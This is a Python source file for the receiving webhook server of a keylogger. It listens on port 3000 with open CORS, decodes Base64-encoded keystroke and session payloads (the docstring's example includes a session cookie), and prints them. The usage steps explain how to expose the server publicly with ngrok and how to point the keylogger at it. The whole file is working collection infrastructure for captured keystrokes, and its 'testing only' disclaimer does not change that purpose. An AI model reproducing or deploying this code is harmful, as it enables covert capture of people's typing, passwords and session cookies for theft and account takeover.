"""
Python Webhook Server for Keylogger Class

This Python server acts as a webhook endpoint for the Keylogger class, 
designed to listen for HTTP POST requests on http://0.0.0.0:3000. 
It processes incoming keystroke data sent by the Keylogger, allowing 
you to log, inspect, and respond to the payloads.

   - The Keylogger sends JSON data containing keystrokes or session information.
   - This server's POST handler (`do_POST`) decodes and prints the payload.
   - If the payload is valid JSON, it logs the structured JSON to the console for inspection.

NOTE: In a production environment, you should secure the server with HTTPS, and store the payload
data securely in a database or log file. This server is for testing and debugging purposes only.

Example Payload Sent by Keylogger:
---------------------------------
{
    "type": "keypress",
    "value": "a",
    "session": {
        "id": "unique-session-id",
        "created_at": "2024-11-29T17:30:00Z",
        "user_agent": "Mozilla/5.0",
        "session_cookie": "master-kw-session"
    }
}

How to Use:
-----------
1. Run this server using:
   $ python3 examples/server.py

    1.1. You can use ngrok to expose the server to the internet:
        $ ngrok http 3000

2. Configure your Keylogger instance to send keystroke data to the webhook URL:
    e.g., new Keylogger("https://your-ngrok-url.ngrok.io")
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import json, base64

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        """
        Handle preflight CORS requests.
        """
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        """
        Handle POST requests with raw Base64 payloads.
        """
        # Read the content length from headers
        content_length = int(self.headers.get('Content-Length', 0))
        # Read the incoming POST data (Base64-encoded string)
        base64_payload = self.rfile.read(content_length).decode('utf-8')

        # Decode Base64-encoded payload
        try:
            decoded_payload = base64.b64decode(base64_payload).decode('utf-8')
            print("Decoded Payload:", decoded_payload)

            # Try parsing the decoded payload as JSON
            try:
                json_payload = json.loads(decoded_payload)
                print("Parsed JSON Payload:", json.dumps(json_payload, indent=4))
            except json.JSONDecodeError:
                print("Decoded payload is not valid JSON.")
        except Exception as e:
            print("Error decoding Base64 payload:", str(e))

        # Respond to the client
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status": "success"}')

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
    """
    Start the HTTP server on localhost:3000.
    """
    server_address = ('0.0.0.0', 3000)
    httpd = server_class(server_address, handler_class)
    print("Starting server on http://0.0.0.0:3000")
    httpd.serve_forever()

if __name__ == "__main__":
    run()

